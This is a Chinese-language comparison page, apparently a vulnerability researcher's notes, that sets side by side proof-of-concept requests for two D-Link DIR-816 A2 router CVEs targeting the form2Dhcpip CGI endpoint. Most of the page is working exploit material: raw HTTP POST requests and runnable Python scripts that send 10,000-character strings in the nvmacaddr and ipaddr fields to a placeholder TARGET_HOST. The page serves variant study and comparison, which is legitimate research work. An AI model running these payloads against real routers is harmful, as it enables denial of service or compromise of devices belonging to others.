# DIR-816 PoC 大块彩色对照

> [!info] 设备与版本
> 本页均为 D-Link DIR-816 A2 的不同版本基准：CVE-2022-29322 = v1.10CNB04；CVE-2023-43238 = v1.10CNB05。

<span style="color:#17803d;font-weight:700">绿色文字：共有请求骨架/字段。</span>　<span style="color:#c2410c;font-weight:700">橙色文字：具体变化字段或载荷。</span>

## <span style="color:#c2410c">B+ 级：CVE-2022-29322 ↔ CVE-2023-43238</span>

> [!warning] 迁移说明
> `CVE-2022-29322` 的原始参考目录当前失效。左侧保留 NVD 明确给出的 `/goform/form2Dhcpip`、`IPADDR`、`nvmacaddr`，并在同一个大块中注明可运行的 `.cgi` 迁移模板；右侧是公开的 `.cgi` PoC。这里标的是请求骨架相似，不把迁移模板冒充成失效仓库的原始报文。

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2022-29322｜左栏含两个独立请求形态</strong>
<div style="font-size:0.9em;margin:4px 0 8px;"><span style="color:#c2410c;font-weight:700">块 1：NVD 确认形态（/goform/form2Dhcpip，IPADDR 大写）</span><br><span style="color:#c2410c;font-weight:700">块 2：同源可运行迁移模板（form2Dhcpip.cgi，ipaddr 小写）</span></div>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29322" target="_blank">NVD ↗</a>；<a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2022-29322" target="_blank">INCIBE 记录 ↗</a>；<a href="https://github.com/EPhaha/IOT_vuln/tree/main/d-link/dir-816/5" target="_blank">原始参考目录（当前 404） ↗</a>；<a href="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank">DIR-816 分析及 form2Dhcpip.cgi PoC ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST <span style="color:#c2410c;font-weight:700">/goform/form2Dhcpip</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">tokenid=&lt;TOKENID&gt;&amp;<span style="color:#c2410c;font-weight:700">IPADDR</span>=<span style="color:#c2410c;font-weight:700"></span>&amp;nvmacaddr=<span style="color:#c2410c;font-weight:700"></span></span>
&nbsp;
<span style="color:#17803d">POST <span style="color:#c2410c;font-weight:700">/goform/form2Dhcpip</span>.cgi HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded</span>
<span style="color:#17803d">Content-Length: &lt;按实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">tokenid=&lt;TOKENID&gt;&amp;lan_assignment=add&amp;nvmacaddr=<span style="color:#c2410c;font-weight:700"></span>&amp;ipaddr=<span style="color:#c2410c;font-weight:700"></span></span>
&nbsp;
<span style="color:#17803d">import requests</span>
&nbsp;
<span style="color:#17803d">base = "http://TARGET_HOST"</span>
<span style="color:#17803d">data = {</span>
<span style="color:#17803d">    "tokenid": "&lt;TOKENID&gt;",</span>
<span style="color:#17803d">    "lan_assignment": "add",</span>
<span style="color:#17803d">    "nvmacaddr": "a" * 10000,</span>
<span style="color:#17803d">    "ipaddr": "a" * 10000,</span>
<span style="color:#17803d">}</span>
<span style="color:#17803d">response = requests.post(base + "<span style="color:#c2410c;font-weight:700">/goform/form2Dhcpip</span>.cgi", data=data, timeout=10)</span>
<span style="color:#17803d">print(response.status_code, response.text[:500])</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">橙色差异：NVD 写作 form2Dhcpip、IPADDR；可运行迁移模板写作 form2Dhcpip.cgi、ipaddr、lan_assignment=add。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2023-43238｜公开 .cgi PoC</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/peris-navince/founded-0-days/blob/main/Dlink/816/form2Dhcpip_cgi/1.md" target="_blank">founded-0-days GitHub PoC ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">import requests</span>
&nbsp;
<span style="color:#17803d">tokenid = "&lt;TOKENID&gt;"</span>
<span style="color:#17803d">url = "http://TARGET_HOST<span style="color:#c2410c;font-weight:700">/goform/form2Dhcpip.cgi</span>"</span>
<span style="color:#17803d">data = {</span>
<span style="color:#17803d">    "tokenid": tokenid,</span>
<span style="color:#17803d">    "nvmacaddr": "a" * 10000,</span>
<span style="color:#17803d">    "ipaddr": "<span style="color:#c2410c;font-weight:700">192.168.0.1</span>",</span>
<span style="color:#17803d">    "<span style="color:#c2410c;font-weight:700">select</span>": "1",</span>
<span style="color:#17803d">    "<span style="color:#c2410c;font-weight:700">lan_assignment</span>": "add"</span>
<span style="color:#17803d">}</span>
<span style="color:#17803d">response = requests.post(url, data=data, timeout=10)</span>
<span style="color:#17803d">print(response.status_code, response.text[:500])</span>
&nbsp;
<span style="color:#17803d">POST <span style="color:#c2410c;font-weight:700">/goform/form2Dhcpip.cgi</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded</span>
<span style="color:#17803d">Content-Length: &lt;由实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">tokenid=&lt;TOKENID&gt;&amp;nvmacaddr=<span style="color:#c2410c;font-weight:700"></span>&amp;ipaddr=<span style="color:#c2410c;font-weight:700">192.168.0.1</span>&amp;<span style="color:#c2410c;font-weight:700">select</span>=1&amp;<span style="color:#c2410c;font-weight:700">lan_assignment</span>=add</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">橙色差异：公开 PoC 的 ipaddr 是 192.168.0.1，并增加 select=1；长输入仍位于 nvmacaddr。</div>
</td>
</tr>
</table>

<span style="color:#b91c1c;font-weight:700">判定：高度相似的迁移级正样本。</span> 两侧都把长字符串放入 `nvmacaddr`，都围绕 `form2Dhcpip` CGI 和 LAN 参数工作；路径、IP 字段大小写、select 和真实长度要作为变体保留。

来源：[CVE-2022-29322 请求与迁移模板](#CVE-2022-29322)、[CVE-2023-43238 完整请求](#CVE-2023-43238)。
